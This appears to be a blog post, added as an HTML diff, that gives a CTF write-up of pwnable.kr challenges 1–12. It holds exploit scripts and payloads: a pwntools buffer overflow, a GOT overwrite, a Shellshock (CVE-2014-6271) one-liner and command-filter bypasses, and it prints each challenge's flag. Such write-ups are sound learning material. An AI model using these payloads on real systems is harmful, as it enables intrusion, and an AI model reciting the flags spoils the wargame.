@@ -1,0 +1,1245 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="pwnable.kr_1, algorithm,web,re,pwn,crypto,deeplearning">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>pwnable.kr_1 | xyzz&#39;Blog</title>
+    <link rel="icon" type="image/png" href="../../../../favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="../../../../libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="../../../../libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="../../../../libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../css/matery.css">
+    <link rel="stylesheet" type="text/css" href="../../../../css/my.css">
+
+    <script src="../../../../libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="../../../../index.html" class="waves-effect waves-light">
+                    
+                    <img src="../../../../headimage.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">xyzz&#39;Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../index.html" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../tags/" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../categories/" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../archives/" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="../../../../headimage.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">xyzz&#39;Blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../index.html" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../tags/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../categories/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../archives/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="../../../../libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '../../../../index.html';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../medias/featureimages/22.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">pwnable.kr_1</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="../../../../libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="../../../../tags/Pwn/">
+                                <span class="chip bg-color">Pwn</span>
+                            </a>
+                        
+                            <a href="../../../../tags/pwnable-kr/">
+                                <span class="chip bg-color">pwnable.kr</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="../../../../categories/bin/" class="post-category">
+                                bin
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2018-07-27
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-05-25
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    10 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="1-fd"><a href="#1-fd" class="headerlink" title="1.[fd]"></a>1.[fd]</h1><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><p>ssh the server.and see three files.fd,fd.c,flag.</p>
+<span id="more"></span>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+char buf[32];
+int main(int argc, char* argv[], char* envp[])&#123;
+  if(argc&lt;2)&#123;
+    printf(&quot;pass argv[1] a number\n&quot;);
+    return 0;
+  &#125;
+  int fd = atoi( argv[1] ) - 0x1234;
+  int len = 0;
+  len = read(fd, buf, 32);
+  if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;
+    printf(&quot;good job :)\n&quot;);
+    system(&quot;/bin/cat flag&quot;);
+    exit(0);
+  &#125;
+  printf(&quot;learn about Linux file IO\n&quot;);
+  return 0;
+&#125;
+</code></pre>
+<p>it’s say how to make function read to work.<br>it’s two func,atoi and read.</p>
+<p>0x1235&#x3D;4661</p>
+<pre><code class="bash">./fd 4661
+
+LETMEWIN\n
+</code></pre>
+<p>flag</p>
+<pre><code>mommy! I think I know what a file descriptor is!!
+</code></pre>
+<h1 id="2-collision"><a href="#2-collision" class="headerlink" title="2.collision"></a>2.collision</h1><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><pre><code class="python">from pwn import *
+k=p32(h-0x01010101*4)+p32(0x01010101)*4
+p=process([&#39;./col&#39;,k])
+p.interactive()
+</code></pre>
+<p>flag</p>
+<pre><code>daddy! I just managed to create a hash collision :)
+</code></pre>
+<h1 id="3-bof"><a href="#3-bof" class="headerlink" title="3.bof"></a>3.bof</h1><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><p>overflow</p>
+<pre><code class="python"># encoding=utf-8
+from pwn import *
+
+ip=&#39;pwnable.kr&#39;
+port=9000
+
+p=remote(ip,port)
+payload=&#39;A&#39;*(0x2c+0x8)+p32(0xcafebabe)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="4-flag"><a href="#4-flag" class="headerlink" title="4.flag"></a>4.flag</h1><p>re</p>
+<h2 id="solve-3"><a href="#solve-3" class="headerlink" title="solve"></a>solve</h2><pre><code>UPX...? sounds like a delivery service :)
+</code></pre>
+<h1 id="5-passcode"><a href="#5-passcode" class="headerlink" title="5.passcode"></a>5.passcode</h1><p>use name to change the address of printf to system.</p>
+<pre><code class="python">payload = &#39;A&#39;*96+&#39;\x00\xa0\x04\x08&#39;+&#39;\n&#39;+str(int(0x80485e3))+&#39;\n&#39;
+</code></pre>
+<p>flag</p>
+<pre><code>Sorry mom.. I got confused about scanf usage :(
+</code></pre>
+<h1 id="6-random"><a href="#6-random" class="headerlink" title="6.random"></a>6.random</h1><p>not real random ,it always 1804289383.</p>
+<h2 id="solve-4"><a href="#solve-4" class="headerlink" title="solve"></a>solve</h2><pre><code>3039230856
+</code></pre>
+<p>flag</p>
+<pre><code>Mommy, I thought libc random is unpredictable...
+</code></pre>
+<h1 id="7-input"><a href="#7-input" class="headerlink" title="7.input"></a>7.input</h1><h2 id="sourcecode"><a href="#sourcecode" class="headerlink" title="sourcecode"></a>sourcecode</h2><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+int main(int argc, char* argv[], char* envp[])&#123;
+  printf(&quot;Welcome to pwnable.kr\n&quot;);
+  printf(&quot;Let&#39;s see if you know how to give input to program\n&quot;);
+  printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;);
+
+  // argv
+  if(argc != 100) return 0;
+  if(strcmp(argv[&#39;A&#39;],&quot;\x00&quot;)) return 0;
+  if(strcmp(argv[&#39;B&#39;],&quot;\x20\x0a\x0d&quot;)) return 0;
+  printf(&quot;Stage 1 clear!\n&quot;);
+
+  // stdio
+  char buf[4];
+  read(0, buf, 4);
+  if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;
+  read(2, buf, 4);
+        if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;
+  printf(&quot;Stage 2 clear!\n&quot;);
+
+  // env
+  if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;
+  printf(&quot;Stage 3 clear!\n&quot;);
+
+  // file
+  FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;);
+  if(!fp) return 0;
+  if( fread(buf, 4, 1, fp)!=1 ) return 0;
+  if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;
+  fclose(fp);
+  printf(&quot;Stage 4 clear!\n&quot;);
+
+  // network
+  int sd, cd;
+  struct sockaddr_in saddr, caddr;
+  sd = socket(AF_INET, SOCK_STREAM, 0);
+  if(sd == -1)&#123;
+    printf(&quot;socket error, tell admin\n&quot;);
+    return 0;
+  &#125;
+  saddr.sin_family = AF_INET;
+  saddr.sin_addr.s_addr = INADDR_ANY;
+  saddr.sin_port = htons( atoi(argv[&#39;C&#39;]) );
+  if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;
+    printf(&quot;bind error, use another port\n&quot;);
+        return 1;
+  &#125;
+  listen(sd, 1);
+  int c = sizeof(struct sockaddr_in);
+  cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);
+  if(cd &lt; 0)&#123;
+    printf(&quot;accept error, tell admin\n&quot;);
+    return 0;
+  &#125;
+  if( recv(cd, buf, 4, 0) != 4 ) return 0;
+  if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;
+  printf(&quot;Stage 5 clear!\n&quot;);
+
+  // here&#39;s your flag
+  system(&quot;/bin/cat flag&quot;);
+  return 0;
+&#125;
+</code></pre>
+<h2 id="solve-5"><a href="#solve-5" class="headerlink" title="solve"></a>solve</h2><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt; 
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netinet/in.h&gt;
+
+int main()
+&#123;
+    /* stage 1 */
+    char *argv[101] = &#123;0&#125;;
+    for(int i = 1; i&lt;100; ++i)
+        argv[i] = &quot;a&quot;;
+    argv[0] = &quot;/home/input2/input&quot;;
+    argv[&#39;A&#39;] = &quot;\x00&quot;;
+    argv[&#39;B&#39;] = &quot;\x20\x0a\x0d&quot;;
+    argv[&#39;C&#39;] = &quot;9999&quot;; //server port
+    argv[100] = NULL;
+
+    /* stage 3 */
+    char *envp[2] = &#123;&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;, NULL&#125;;
+
+    /* stage 4 */  // ! : file open before execve , or the check will fail 
+    FILE *fp = fopen(&quot;\x0a&quot;, &quot;wb&quot;); // wb,w are similar in linux but differ in win
+    if(!fp)                         //see \x0d\x0a in win and \x0a in linux
+    &#123;
+        perror(&quot;Cannot open file.&quot;);
+        exit(1);
+    &#125;
+    printf(&quot;open file success.\n&quot;);
+    fwrite(&quot;\x00\x00\x00\x00&quot;, 4, 1, fp);
+    fclose(fp);
+    
+    /* stage 2 */
+    int pipe_stdin[2] = &#123;-1, -1&#125;;
+    int pipe_stderr[2] = &#123;-1, -1&#125;;
+    pid_t pid_child;
+    if ( pipe(pipe_stdin) &lt; 0 || pipe(pipe_stderr) &lt; 0 )
+    &#123;
+        perror(&quot;Cannot create the pipe.&quot;);
+        exit(1);
+    &#125;
+
+    #define STDIN_READ   pipe_stdin[0]
+    #define STDIN_WRITE  pipe_stdin[1]
+    #define STDERR_READ  pipe_stderr[0]
+    #define STDERR_WRITE pipe_stderr[1]
+    if ( ( pid_child = fork() ) &lt; 0 )   // do not forget the ()!
+    &#123;
+        perror(&quot;Cannot create fork child.&quot;);
+        exit(1);
+    &#125;
+
+    if( pid_child == 0 )
+    &#123;
+        /*child proc*/
+        sleep(1); //wait to pipe link 0,2
+        close(STDIN_READ);
+        close(STDERR_READ);
+        write(STDIN_WRITE, &quot;\x00\x0a\x00\xff&quot;, 4);
+        write(STDERR_WRITE, &quot;\x00\x0a\x02\xff&quot;, 4);
+    &#125;
+    else
+    &#123;
+        /*parent proc*/
+        close(STDIN_WRITE);
+        close(STDERR_WRITE);
+        dup2(STDIN_READ, 0);  //dup to 0-stdin
+        dup2(STDERR_READ, 2); //dup to 2-stderr
+        printf(&quot;start execve input.\n&quot;);
+        execve(&quot;/home/input2/input&quot;, argv, envp);
+            perror(&quot;Fail to execute the program&quot;);
+            exit(1);
+    &#125;
+    printf(&quot;pipe link.\n&quot;);
+
+    /* stage 5 */
+    sleep(2); // wait the server start
+    int sockfd;
+    char buf[10] = &#123;0&#125;; // buf to be sent
+    int len;            // len of avail buf
+    struct sockaddr_in servaddr;
+    servaddr.sin_family = AF_INET;  
+    servaddr.sin_port = htons(9999);  // port in argv[&#39;C&#39;] 
+    servaddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); //local
+    if( (sockfd = socket(PF_INET, SOCK_STREAM, 0)) &lt; 0 )  
+    &#123;  
+        perror(&quot;socket error.&quot;);  
+        exit(1);  
+    &#125;  
+    if ( connect(sockfd, (struct sockaddr*) &amp;servaddr, sizeof(servaddr)) &lt; 0 )
+    &#123;
+        perror(&quot;connect error.&quot;);
+        exit(1);
+        &#125;
+    printf(&quot;socket connect.\n&quot;);
+    strcpy(buf, &quot;\xde\xad\xbe\xef&quot;);
+    len = strlen(buf);
+    send(sockfd, buf, len, 0);
+    close(sockfd);  
+
+    return 0;
+&#125;
+</code></pre>
+<pre><code>ln -s /home/input2/flag flag
+gcc 1.c -g
+./a.out
+</code></pre>
+<p>flag</p>
+<pre><code>Mommy! I learned how to pass various input in Linux :)
+</code></pre>
+<h1 id="8-leg"><a href="#8-leg" class="headerlink" title="8.leg"></a>8.leg</h1><h2 id="solve-6"><a href="#solve-6" class="headerlink" title="solve"></a>solve</h2><pre><code>key1=0x8cdc+8
+key2=0x8d04+4
+key3=0x8d80
+</code></pre>
+<p>flag</p>
+<pre><code>My daddy has a lot of ARMv5te muscle!
+</code></pre>
+<h1 id="9-mistake"><a href="#9-mistake" class="headerlink" title="9.mistake"></a>9.mistake</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+
+#define PW_LEN 10
+#define XORKEY 1
+
+void xor(char* s, int len)&#123;
+  int i;
+  for(i=0; i&lt;len; i++)&#123;
+    s[i] ^= XORKEY;
+  &#125;
+&#125;
+
+int main(int argc, char* argv[])&#123;
+
+  int fd;
+  if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123;
+    printf(&quot;can&#39;t open password %d\n&quot;, fd);
+    return 0;
+  &#125;
+
+  printf(&quot;do not bruteforce...\n&quot;);
+  sleep(time(0)%20);
+
+  char pw_buf[PW_LEN+1];
+  int len;
+  if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;
+    printf(&quot;read error\n&quot;);
+    close(fd);
+    return 0;
+  &#125;
+
+  char pw_buf2[PW_LEN+1];
+  printf(&quot;input password : &quot;);
+  scanf(&quot;%10s&quot;, pw_buf2);
+
+  // xor your input
+  xor(pw_buf2, 10);
+
+  if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;
+    printf(&quot;Password OK\n&quot;);
+    system(&quot;/bin/cat flag\n&quot;);
+  &#125;
+  else&#123;
+    printf(&quot;Wrong Password\n&quot;);
+  &#125;
+
+  close(fd);
+  return 0;
+&#125;
+</code></pre>
+<h2 id="solve-7"><a href="#solve-7" class="headerlink" title="solve"></a>solve</h2><p>open &gt;&#x3D; 0.so fd&#x3D;if(0 &lt; open) &#x3D; 0;</p>
+<p>payload</p>
+<pre><code>0000000000
+1111111111
+</code></pre>
+<p>flag</p>
+<pre><code>Mommy, the operator priority always confuses me :(
+</code></pre>
+<h1 id="10-shellshock"><a href="#10-shellshock" class="headerlink" title="10.shellshock"></a>10.shellshock</h1><p>CVE-2014-6271</p>
+<h2 id="solve-8"><a href="#solve-8" class="headerlink" title="solve"></a>solve</h2><pre><code class="bash">env x=&#39;() &#123; :;&#125;; /bin/cat flag&#39; ./shellshock
+</code></pre>
+<p>flag</p>
+<pre><code>only if I knew CVE-2014-6271 ten years ago..!!
+</code></pre>
+<h1 id="11-cmd1"><a href="#11-cmd1" class="headerlink" title="11.cmd1"></a>11.cmd1</h1><h2 id="question-1"><a href="#question-1" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int filter(char* cmd)&#123;
+  int r=0;
+  r += strstr(cmd, &quot;flag&quot;)!=0;
+  r += strstr(cmd, &quot;sh&quot;)!=0;
+  r += strstr(cmd, &quot;tmp&quot;)!=0;
+  return r;
+&#125;
+int main(int argc, char* argv[], char** envp)&#123;
+  putenv(&quot;PATH=/thankyouverymuch&quot;);
+  if(filter(argv[1])) return 0;
+  system( argv[1] );
+  return 0;
+&#125;
+</code></pre>
+<h2 id="solve-9"><a href="#solve-9" class="headerlink" title="solve"></a>solve</h2><pre><code class="bash">./cmd1 &quot;/bin/cat /home/cmd1/fl*&quot;
+</code></pre>
+<p>flag</p>
+<pre><code>mommy now I get what PATH environment is for :)
+</code></pre>
+<h1 id="12-cmd2"><a href="#12-cmd2" class="headerlink" title="12.cmd2"></a>12.cmd2</h1><h2 id="question-2"><a href="#question-2" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int filter(char* cmd)&#123;
+  int r=0;
+  r += strstr(cmd, &quot;=&quot;)!=0;
+  r += strstr(cmd, &quot;PATH&quot;)!=0;
+  r += strstr(cmd, &quot;export&quot;)!=0;
+  r += strstr(cmd, &quot;/&quot;)!=0;
+  r += strstr(cmd, &quot;`&quot;)!=0;
+  r += strstr(cmd, &quot;flag&quot;)!=0;
+  return r;
+&#125;
+
+extern char** environ;
+void delete_env()&#123;
+  char** p;
+  for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
+&#125;
+
+int main(int argc, char* argv[], char** envp)&#123;
+  delete_env();
+  putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;);
+  if(filter(argv[1])) return 0;
+  printf(&quot;%s\n&quot;, argv[1]);
+  system( argv[1] );
+  return 0;
+&#125;
+</code></pre>
+<h2 id="solve-10"><a href="#solve-10" class="headerlink" title="solve"></a>solve</h2><pre><code class="bash">cd /tmp
+mkdir xyzzpwn
+cd xyzzpwn
+echo &quot;/bin/cat /home/cmd2/flag&quot; &gt;xyzz
+chmod +x xyzz
+cd /
+/home/cmd2/cmd2 &#39;$(pwd)tmp$(pwd)xyzzpwn$(pwd)xyzz&#39;
+</code></pre>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre><code>FuN_w1th_5h3ll_v4riabl3s_haha
+</code></pre>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="../../../../about" rel="external nofollow noreferrer">xyzz</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://www.xyzzpwn.top">http://www.xyzzpwn.top</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="../../../../about" target="_blank">xyzz</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="../../../../tags/Pwn/">
+                                    <span class="chip bg-color">Pwn</span>
+                                </a>
+                            
+                                <a href="../../../../tags/pwnable-kr/">
+                                    <span class="chip bg-color">pwnable.kr</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="../../../../libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="../../../../libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="../pwnable-kr-2/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../medias/featureimages/23.jpg" class="responsive-img" alt="pwnable.kr_2">
+                        
+                        <span class="card-title">pwnable.kr_2</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            13.uafquestion
+#include &lt;fcntl.h&gt;
+#include &lt;iostream&gt;
+#include &lt;cstring&gt;
+#include &lt;cstdlib&gt;
+#inc
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2018-07-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="../../../../categories/bin/" class="post-category">
+                                    bin
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="../../../../tags/Pwn/">
+                        <span class="chip bg-color">Pwn</span>
+                    </a>
+                    
+                    <a href="../../../../tags/pwnable-kr/">
+                        <span class="chip bg-color">pwnable.kr</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="../../../06/23/static-web/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../medias/featureimages/22.jpg" class="responsive-img" alt="static web">
+                        
+                        <span class="card-title">static web</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Because my teacher tell me to build a static web server for defend the attack.I think i should do this things:
+
+it can d
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2018-06-23
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="../../../../categories/web/" class="post-category">
+                                    web
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="../../../../tags/static/">
+                        <span class="chip bg-color">static</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="../../../../libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="../../../../libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="../../../../libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="../../../../libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
